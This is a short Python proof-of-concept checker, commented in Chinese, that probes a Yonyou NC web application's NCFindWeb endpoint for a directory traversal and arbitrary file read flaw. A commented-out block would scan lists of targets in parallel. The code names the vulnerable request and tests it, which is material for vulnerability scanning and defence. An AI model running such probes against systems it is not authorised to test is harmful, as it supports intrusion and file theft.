import requests



def exp_check(target_url):
    print('[*]正在该NC网站是否存在目录遍历和任意文件读取漏洞')
    url = target_url + '/NCFindWeb?service=IPreAlertConfigService&filename='
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.360'
    }
    try:
        response = requests.get(url=url, headers=headers, timeout=5)
        if response.status_code == 200 and 'Client' in response.text:
            # print('[SUCCESS]该系统可能存在目录遍历和任意文件读取漏洞，具体URL为:'+url+'\n')
            return 1
        else:
            # print('[WARNING]该系统不存在目录遍历和任意文件读取\n')
            return 2
    except:
        # print('[WARNING] 无法该目标无法建立连接\n')
        return 3


# if __name__ == '__main__':
#     try:
#         parser = argparse.ArgumentParser()
#         parser.add_argument('-u', '--url', dest='url', help='Target Url')
#         parser.add_argument('-f', '--file', dest='file', help='Target Url')
#         args = parser.parse_args()
#         if args.file:
#             pool = multiprocessing.Pool()
#             for url in args.file:
#                 pool.apply_async(main, args=(url.strip('\n'),))
#             pool.close()
#             pool.join()
#         elif args.url:
#             main(args.url)
#         else:
#             console.print('缺少URL目标, 请使用 [-u URL] or [-f FILE]')
#     except KeyboardInterrupt:
#         console.console.print('\nCTRL+C 退出', style='reverse bold red')